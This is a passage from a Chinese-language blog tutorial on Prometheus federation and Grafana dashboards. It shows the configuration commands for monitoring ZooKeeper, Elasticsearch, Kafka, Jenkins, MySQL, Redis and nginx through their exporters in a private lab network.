alt="在这里插入图片描述"></p><p><strong>导入样板</strong><br><img src="https://i-blog.csdnimg.cn/direct/849314b2241045a28049f184cabcafcd.png" alt="在这里插入图片描述"></p><p><strong>选择样板id</strong><br><img src="https://i-blog.csdnimg.cn/direct/32037fdf1cc2467fa22574fc36677118.png" alt="在这里插入图片描述"></p><p><strong>选择数据源</strong></p><p><img src="https://i-blog.csdnimg.cn/direct/2218c681c0de4de39e80bc63a92c4ed0.png" alt="在这里插入图片描述"></p><p><strong>配置grafana展示node-exporter数据</strong><br><img src="https://i-blog.csdnimg.cn/direct/2aee5db9f02445a4b4bbebe06cad4744.png" alt="在这里插入图片描述"></p><h4 id="grafana自定义dashboard"><a href="#grafana自定义dashboard" class="headerlink" title="grafana自定义dashboard"></a>grafana自定义dashboard</h4><p><img src="https://i-blog.csdnimg.cn/direct/0af2d0c02ef44fbfab2c39a58387bd87.png" alt="在这里插入图片描述"></p><h4 id="grafana实现备份和恢复"><a href="#grafana实现备份和恢复" class="headerlink" title="grafana实现备份和恢复"></a>grafana实现备份和恢复</h4><p>保存json文件，恢复的时候可粘贴内容或者导入文件</p><h2 id="8、联邦模式"><a href="#8、联邦模式" class="headerlink" title="8、联邦模式"></a>8、联邦模式</h2><p>默认情况下，prometheus采集的数据会存储到本地，这意味者prometheus在这种工作模式下，可能会存在单机存储的瓶颈。</p><ul><li><p>为了解决prometheus对于数据的采集压力，我们可以采用联邦模式来部署prometheus</p></li><li><p>所谓联邦模式就是部署多个server共同采集数据</p></li></ul><h4 id="联邦架构图"><a href="#联邦架构图" class="headerlink" title="联邦架构图"></a><strong>联邦架构图</strong></h4><p><img src="https://i-blog.csdnimg.cn/direct/26cbfe2310e248c59a3e22826211db12.png" alt="在这里插入图片描述"></p><h4 id="部署联邦模式"><a href="#部署联邦模式" class="headerlink" title="部署联邦模式"></a><strong>部署联邦模式</strong></h4><p>1.修改prometheus server32配置</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash">修改prometheus server配置文件<br>[root@prometheus-server32 ~]# vim /softwares/prometheus-2.53.2.linux-amd64/prometheus.yml <br>...<br>scrape_configs:<br>  ...<br><br>  - job_name: <span class="hljs-string">&#x27;file-service-discovery-32&#x27;</span><br>    static_configs:<br>    - targets:<br>      - <span class="hljs-string">&quot;10.0.0.41:9100&quot;</span><br><br>重载prometheus server<br>[root@prometheus-server32 ~]# curl -X POST http://10.0.0.32:9090/-/reload<br><br>验证数据是否采集成功<br>http://10.0.0.32:9090/targets<br></code></pre></td></tr></table></figure><p>2.修改prometheus server33配置</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs bash">修改prometheus server的配置文件<br>[root@prometheus-server33 ~]# vim /softwares/prometheus-2.53.2.linux-amd64/prometheus.yml <br><br>...<br>scrape_configs:<br>  ...<br>  - job_name: <span class="hljs-string">&#x27;file-service-discovery-33&#x27;</span><br>    static_configs:<br>    - targets:<br>      - <span class="hljs-string">&quot;10.0.0.42:9100&quot;</span><br>  - <span class="hljs-string">&quot;10.0.0.43:9100&quot;</span><br><br>重载prometheus server<br>[root@prometheus-server33 ~]# curl -X POST http://10.0.0.33:9090/-/reload<br><br>验证数据是否采集成功<br>http://10.0.0.33:9090/targets<br></code></pre></td></tr></table></figure><p>3.修改Prometheus server31配置</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs bash">修改prometheus server的配置文件<br>[root@prometheus-server31 ~]# vim /softwares/prometheus-2.53.2.linux-amd64/prometheus.yml <br>...<br>scrape_configs:<br>  ...<br>  - job_name: <span class="hljs-string">&quot;prometheus-federate-32&quot;</span><br>    metrics_path: <span class="hljs-string">&quot;/federate&quot;</span><br>    <span class="hljs-comment"># 用于解决标签的冲突问题，有效值为: true和false，默认值为false</span><br>    <span class="hljs-comment"># 当设置为true时，将保留抓取的标签以忽略服务器自身的标签。说白了会覆盖原有标签。</span><br>    <span class="hljs-comment"># 当设置为false时，则不会覆盖原有标签，而是在标点前加了一个&quot;exported_&quot;前缀。</span><br>    honor_labels: <span class="hljs-literal">true</span><br>    params:<br>       <span class="hljs-string">&quot;match[]&quot;</span>:<br>       - <span class="hljs-string">&#x27;&#123;job=&quot;promethues&quot;&#125;&#x27;</span><br>       - <span class="hljs-string">&#x27;&#123;__name__=~&quot;job:.*&quot;&#125;&#x27;</span><br>       - <span class="hljs-string">&#x27;&#123;__name__=~&quot;node.*&quot;&#125;&#x27;</span><br>    static_configs:<br>    - targets:<br>        - <span class="hljs-string">&quot;10.0.0.32:9090&quot;</span><br><br>  - job_name: <span class="hljs-string">&quot;prometheus-federate-33&quot;</span><br>    metrics_path: <span class="hljs-string">&quot;/federate&quot;</span><br>    honor_labels: <span class="hljs-literal">true</span><br>    params:<br>       <span class="hljs-string">&quot;match[]&quot;</span>:<br>       - <span class="hljs-string">&#x27;&#123;job=&quot;promethues&quot;&#125;&#x27;</span><br>       - <span class="hljs-string">&#x27;&#123;__name__=~&quot;job:.*&quot;&#125;&#x27;</span><br>       - <span class="hljs-string">&#x27;&#123;__name__=~&quot;node.*&quot;&#125;&#x27;</span><br>    static_configs:<br>    - targets:<br>        - <span class="hljs-string">&quot;10.0.0.33:9090&quot;</span><br><br>检查配置文件语法<br>[root@prometheus-server31 ~]# check <br><br>重载prometheus server<br>[root@prometheus-server31 ~]# rr<br><br>验证数据是否采集成功<br>http://10.0.0.31:9090/targets<br><br></code></pre></td></tr></table></figure><h2 id="9、监控流程"><a href="#9、监控流程" class="headerlink" title="9、监控流程"></a>9、监控流程</h2><p>普罗米修斯监控可分为两类，云原生应用和非云原生应用。</p><p>云原生应用提供metrics，不需要安装exporters客户端，直接修改配置文件即可</p><p>非云原生应用需要安装exportes客户端，并启动客户端，服务端yaml文件加入客户端ip和端口</p><h2 id="10、监控zookeeper集群"><a href="#10、监控zookeeper集群" class="headerlink" title="10、监控zookeeper集群"></a>10、监控zookeeper集群</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs bash">修改zookeeper集群的配置文件<br>[root@elk91 ~]# vim /softwares/apache-zookeeper-3.8.4-bin/conf/zoo.cfg <br>...<br><span class="hljs-comment"># https://prometheus.io Metrics Exporter</span><br>metricsProvider.className=org.apache.zookeeper.metrics.prometheus.PrometheusMetricsProvider<br>metricsProvider.httpHost=0.0.0.0<br>metricsProvider.httpPort=7000<br>metricsProvider.exportJvmInfo=<span class="hljs-literal">true</span><br>...           <br>[root@elk91 ~]# systemctl restart zk<br><br>测试服务是否正常<br>[root@elk91 ~]# <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> `<span class="hljs-built_in">seq</span> 91 93`; <span class="hljs-keyword">do</span> <span class="hljs-built_in">echo</span> <span class="hljs-built_in">stat</span> | nc 10.0.0.<span class="hljs-variable">$i</span> 2181 | grep Mode;<span class="hljs-keyword">done</span><br>Mode: follower<br>Mode: leader<br>Mode: follower<br><br>访问webUI<br>http://10.0.0.91:7000/metrics<br><br>Prometheus server配置监控zookeeper集群<br>[root@prometheus-server31 ~]# <span class="hljs-built_in">tail</span> -6 /softwares/prometheus-2.53.2.linux-amd64/prometheus.yml <br>  - job_name: zookeeper<br>    static_configs:<br>    - targets:<br>      - 10.0.0.91:7000<br>      - 10.0.0.92:7000<br>      - 10.0.0.93:7000<br>[root@prometheus-server31 ~]# <br>[root@prometheus-server31 ~]# check<br>重载服务<br>[root@prometheus-server31 ~]# rr<br><br>访问Prometheus的WebUI进行验证<br>http://10.0.0.31:9090/targets<br><br>grafana导入模板<br>10465<br></code></pre></td></tr></table></figure><h2 id="11、客户端下载地址"><a href="#11、客户端下载地址" class="headerlink" title="11、客户端下载地址"></a>11、客户端下载地址</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">监控应用的流程Prometheus<br>https://prometheus.io/docs/instrumenting/exporters/<br></code></pre></td></tr></table></figure><h2 id="12、监控elasticsearch集群"><a href="#12、监控elasticsearch集群" class="headerlink" title="12、监控elasticsearch集群"></a>12、监控elasticsearch集群</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs bash">1.下载elasticsearch exporter<br>https://github.com/prometheus-community/elasticsearch_exporter/releases/download/v1.7.0/elasticsearch_exporter-1.7.0.linux-amd64.tar.gz<br><br>2.解压软件包 <br>[root@elk91 ~]# tar xf elasticsearch_exporter-1.7.0.linux-amd64.tar.gz <br><br>3.启动测试<br>[root@elk91 elasticsearch_exporter-1.7.0.linux-amd64]# ./elasticsearch_exporter --es.uri=<span class="hljs-string">&quot;http://elastic:123456@10.0.0.93:9200&quot;</span> --web.listen-address=:9114 --web.telemetry-path=<span class="hljs-string">&quot;/metrics&quot;</span> <br><br>4.Prometheus server监控es的exporter<br>[root@prometheus-server31 ~]# vim /softwares/prometheus-2.53.2.linux-amd64/prometheus.yml <br>...<br><br>  - job_name: elasticsearch<br>    static_configs:<br>    - targets:<br>      - 10.0.0.91:9114<br>      <br>[root@prometheus-server31 ~]# rr<br><br>5.查看Prometheus的WebUI是否监控到目标<br>http://10.0.0.31:9090/targets<br><br>6.grafana出图展示<br>14191<br></code></pre></td></tr></table></figure><h2 id="13、监控kafka集群"><a href="#13、监控kafka集群" class="headerlink" title="13、监控kafka集群"></a>13、监控kafka集群</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs bash">1.启动kafka集群<br>[root@elk91 ~]# kafka-server-start.sh -daemon <span class="hljs-variable">$KAFKA_HOME</span>/config/server.properties <br><br>[root@elk92 ~]# kafka-server-start.sh -daemon <span class="hljs-variable">$KAFKA_HOME</span>/config/server.properties <br><br>[root@elk93 ~]# kafka-server-start.sh -daemon <span class="hljs-variable">$KAFKA_HOME</span>/config/server.properties <br><br>2.验证kafka服务是否正常<br>[root@elk91 ~]# zkCli.sh <span class="hljs-built_in">ls</span> /kafka371/brokers/ids  | grep <span class="hljs-string">&quot;^\[&quot;</span><br><br>3.下载kafka的exporter<br>wget https://github.com/danielqsj/kafka_exporter/releases/download/v1.7.0/kafka_exporter-1.7.0.linux-amd64.tar.gz<br><br>4.解压目录中指定文件kafka_exporter到指定路径<br>[root@elk91 ~]# tar xf  kafka_exporter-1.7.0.linux-amd64.tar.gz -C /usr/local/bin/ kafka_exporter-1.7.0.linux-amd64/kafka_exporter  --strip-components=1<br><br>5.启动 kafka_exporter<br>[root@elk91 ~]# kafka_exporter --web.listen-address=<span class="hljs-string">&quot;:9308&quot;</span> --web.telemetry-path=<span class="hljs-string">&quot;/metrics&quot;</span>  --kafka.version=<span class="hljs-string">&quot;3.7.1&quot;</span> --kafka.server=10.0.0.93:9092<br><br>6.访问测试kafka的exporter页面<br>http://10.0.0.91:9308/metrics<br><br>7.Prometheus配置监控kafka的exporter<br>[root@prometheus-server31 ~]# vim /softwares/prometheus-2.53.2.linux-amd64/prometheus.yml <br>...<br>  - job_name: kafka<br>    static_configs:<br>    - targets:<br>      - 10.0.0.91:9308<br>  <br>[root@prometheus-server31 ~]# rr<br><br>8.查看Prometheus的WebUI是否监控到目标<br>http://10.0.0.31:9090/targets<br><br>9.grafana出图展示<br>12460<br><br>9.测试验证准确信<br>9.1 创建topic<br>[root@elk93 ~]# kafka-topics.sh --bootstrap-server 10.0.0.91:9092 --create --topic xixi --partitions 3 <br>Created topic xixi.<br>[root@elk93 ~]# <br><br><br>9.2 启动消费者<br>[root@elk92 ~]# kafka-console-consumer.sh --bootstrap-server 10.0.0.91:9092  --topic xixi <br><br>9.3 启动生产者<br>[root@elk93 ~]# kafka-console-producer.sh --bootstrap-server 10.0.0.91:9092  --topic xixi<br></code></pre></td></tr></table></figure><h2 id="14、监控Jenkins服务"><a href="#14、监控Jenkins服务" class="headerlink" title="14、监控Jenkins服务"></a>14、监控Jenkins服务</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs bash">1.jenkins安装Prometheus插件<br>如果安装插件失败，可以直接导入tar包到/var/lib/jenkins/plugins目录并重启。<br>tar xf jenkins-plugins.tar.gz <br><br>2.验证Jenkins的metrics组件是否生效<br>[root@jenkins211 plugins]# systemctl restart jenkins<br>http://10.0.0.211:8080/prometheus/<br><br>3.验证Jenkins的metrics组件是否生效<br>http://10.0.0.211:8080/prometheus/<br><br>4.修改Prometheus的配置文件<br>[root@prometheus-server31 ~]# vim /softwares/prometheus-2.53.2.linux-amd64/prometheus.yml <br>...<br>  - job_name: jenkins<br>    metrics_path: /prometheus<br>    static_configs:<br>    - targets:<br>      - 10.0.0.211:8080<br>...<br><br>[root@prometheus-server31 ~]# rr<br><br>5.访问Prometheus的WebUI<br>http://10.0.0.31:9090/targets<br><br>6.导入Jenkins的相关模板<br>9964<br>9524<br>12646<br></code></pre></td></tr></table></figure><h2 id="15、监控mysql服务"><a href="#15、监控mysql服务" class="headerlink" title="15、监控mysql服务"></a>15、监控mysql服务</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs bash">1.部署MySQL<br>[root@jenkins211 ~]# docker run --name mysql-server -d \<br>             -e MYSQL_USER=<span class="hljs-string">&quot;root&quot;</span> \<br>             -e MYSQL_PASSWORD=<span class="hljs-string">&quot;123456&quot;</span> \<br>             -e MYSQL_ALLOW_EMPTY_PASSWORD=<span class="hljs-string">&quot;yes&quot;</span> \<br>             --network=host \<br> --restart unless-stopped \<br>             mysql:8.4.2-oracle \<br>             --character-set-server=utf8mb4 --collation-server=utf8mb4_bin <br>             <br>[root@jenkins211 ~]# docker ps -l<br>CONTAINER ID   IMAGE                COMMAND                  CREATED          STATUS          PORTS     NAMES<br>5db1d0101b5c   mysql:8.3.0-oracle   <span class="hljs-string">&quot;docker-entrypoint.s…&quot;</span>   13 seconds ago   Up 13 seconds             mysql-server<br>[root@jenkins211 ~]# <br>[root@jenkins211 ~]# ss -ntl | grep 3306<br>LISTEN 0      151                *:3306             *:*          <br>LISTEN 0      70                 *:33060            *:*   <br><br><br>2.下载mysql exporter <br>wget https://github.com/prometheus/mysqld_exporter/releases/download/v0.15.1/mysqld_exporter-0.15.1.linux-amd64.tar.gz<br><br>3.安装mysql exporters<br>[root@jenkins211 ~]# tar xf mysqld_exporter-0.15.1.linux-amd64.tar.gz -C /usr/local/bin/ mysqld_exporter-0.15.1.linux-amd64/mysqld_exporter  --strip-components=1<br><br>4.准备MySQL的链接认证文件，创建MySQL的配置，指定默认的用户名和密码<br>[root@jenkins211 ~]# <span class="hljs-built_in">cat</span>  ~/.my.cnf <br>[client]<br>user=root<br>password=123456<br><br>5.运行mysqld-exporter<br>[root@jenkins211 ~]# mysqld_exporter --mysqld.address=<span class="hljs-string">&quot;10.0.0.211:3306&quot;</span> --web.listen-address=:9104 --config.my-cnf=<span class="hljs-string">&quot;/root/.my.cnf&quot;</span><br><br>6.访问mysqld_exporter的webUI<br>http://10.0.0.211:9104/metrics<br><br>7.修改Prometheus的配置文件<br>[root@prometheus-server31 ~]# vim /softwares/prometheus-2.53.2.linux-amd64/prometheus.yml <br>...<br>  - job_name: mysql<br>    static_configs:<br>    - targets:<br>      - 10.0.0.211:9104<br>      <br>[root@prometheus-server31 ~]# rr<br><br>8.查看Prometheus是否监控到数据<br>http://10.0.0.31:9090/targets<br><br>9.grafana出图展示<br>18949<br>17320<br>14057<br></code></pre></td></tr></table></figure><h2 id="16、监控Redis服务"><a href="#16、监控Redis服务" class="headerlink" title="16、监控Redis服务"></a>16、监控Redis服务</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs bash">1.部署Redis<br>[root@jenkins211 ~]# docker run -d --name redis-server --restart always --network host  redis:7.2.5<br><br>2.下载redis-exporter<br>wget https://github.com/oliver006/redis_exporter/releases/download/v1.52.0/redis_exporter-v1.52.0.linux-amd64.tar.gz<br><br>3.解压软件包到PATH路径<br>[root@jenkins211 ~]# tar xf redis_exporter-v1.61.0.linux-amd64.tar.gz -C /usr/local/bin/ redis_exporter-v1.61.0.linux-amd64/redis_exporter --strip-components=1<br>[root@jenkins211 ~]# ll /usr/local/bin/<br><br>4.运行redis-exporter<br>[root@jenkins211 ~]# redis_exporter -web.listen-address=:9121 -web.telemetry-path=/metrics  -redis.addr=redis://10.0.0.211:6379<br><br>5.访问redis-exporter的WebUI<br>http://10.0.0.211:9121/metrics<br><br>6.修改Prometheus的配置文件<br>[root@prometheus-server31 ~]# vim /softwares/prometheus-2.53.2.linux-amd64/prometheus.yml <br>...<br>  - job_name: redis<br>    static_configs:<br>    - targets:<br>      - 10.0.0.211:9121<br>[root@prometheus-server31 ~]# rr<br><br><br>7.访问Prometheus的WebUI<br>http://10.0.0.31:9090/targets<br><br>8.grafana出图展示<br>763<br>14091<br></code></pre></td></tr></table></figure><h2 id="17、安装grafana插件"><a href="#17、安装grafana插件" class="headerlink" title="17、安装grafana插件"></a>17、安装grafana插件</h2><p><strong>在线安装</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">grafana的版本为9.5.21<br>软件包下载到/var/lib/grafana/plugins/目录<br><br>[root@prometheus-server31 grafana]# grafana-cli plugins install natel-discrete-panel<br></code></pre></td></tr></table></figure><p><strong>离线安装</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@grafana71 ~]# wget  https://grafana.com/api/plugins/natel-discrete-panel/versions/latest/download -O /opt/natel-discrete-panel.zip<br><br>[root@prometheus-server31 ~]# unzip natel-discrete-panel-0.1.1.zip -d /var/lib/grafana/plugins/<br><br>[root@prometheus-server31 ~]# systemctl restart grafana-server<br><br>[root@prometheus-server31 ~]# ss -ntl | grep 3000<br>LISTEN 0      4096               *:3000            *:*          <br></code></pre></td></tr></table></figure><h2 id="18、监控nginx服务"><a href="#18、监控nginx服务" class="headerlink" title="18、监控nginx服务"></a>18、监控nginx服务</h2><p><strong>编译安装nginx</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><code class="hljs bash">1 安装编译工具<br>CentOS：<br>yum -y install git wget gcc make zlib-devel gcc-c++ libtool openssl openssl-devel<br><br>Ubuntu：<br>apt -y install git wget gcc make zlib1g-dev build-essential libtool openssl libssl-dev<br><br>2 克隆nginx-module-vts模块<br>git <span class="hljs-built_in">clone</span> git://github.com/vozlt/nginx-module-vts.git<br>或者<br>git <span class="hljs-built_in">clone</span> https://gitee.com/jasonyin2020/nginx-module-vts.git<br><br>3 下载nginx软件包<br>wget https://nginx.org/download/nginx-1.26.2.tar.gz<br><br>4 解压nginx<br>tar xf nginx-1.26.2.tar.gz<br><br><br>5 配置nginx<br><span class="hljs-built_in">cd</span> nginx-1.26.2<br>./configure --prefix=/softwares/nginx \<br>  --with-http_ssl_module \<br>  --with-http_v2_module \<br>  --with-http_realip_module \<br>  --without-http_rewrite_module \<br>  --with-http_stub_status_module \<br>  --without-http_gzip_module  \<br>  --with-file-aio \<br>  --with-stream \<br>  --with-stream_ssl_module \<br>  --with-stream_realip_module \<br>  --add-module=/root/nginx-module-vts<br><br>6 编译并安装nginx<br>make -j 2 &amp;&amp; make install<br><br>7 修改nginx的配置文件<br>vim /softwares/nginx/conf/nginx.conf<br>...<br>http &#123;<br>    <span class="hljs-comment">#加入编译的status模块，将请求代理到31:9090端口</span><br>    vhost_traffic_status_zone;<br>    upstream promethues &#123;<br>       server 10.0.0.31:9090;<br>    &#125;<br>    ...<br>    server &#123;<br>        ...<br>        location / &#123;<br>            root   html;<br>            <span class="hljs-comment"># index  index.html index.htm;</span><br>            proxy_pass http://promethues;<br>        &#125;<br><br>        location /status &#123;<br>            vhost_traffic_status_display;<br>            vhost_traffic_status_display_format html;<br>        &#125;<br>    &#125;<br>&#125;<br><br>8 检查配置文件语法<br>[root@jenkins211 ~]# /softwares/nginx/sbin/nginx -t<br><br>9 启动nginx<br>[root@jenkins211 ~]# /softwares/nginx/sbin/nginx<br>[root@jenkins211 ~]# <br>[root@jenkins211 ~]# ss -ntl | grep 80<br>LISTEN 0      511          0.0.0.0:80        0.0.0.0:*      <br><br>10 访问nginx的状态页面<br>http://10.0.0.211/status/format/prometheus<br>http://10.0.0.211/status<br></code></pre></td></tr></table></figure><p><strong>安装nginx-vtx-exporter</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">1.下载nginx-vtx-exporter,不建议下载最新版本<br>wget https://github.com/hnlq715/nginx-vts-exporter/releases/download/v0.10.3/nginx-vts-exporter-0.10.3.linux-amd64.tar.gz<br><br>2 解压软件包到path路径<br>tar xf nginx-vts-exporter-0.10.3.linux-amd64.tar.gz -C /usr/local/bin/ nginx-vts-exporter-0.10.3.linux-amd64/nginx-vts-exporter --strip-components=1<br><br>3 运行nginx-vtx-exporter<br>[root@jenkins211 ~]# nginx-vts-exporter 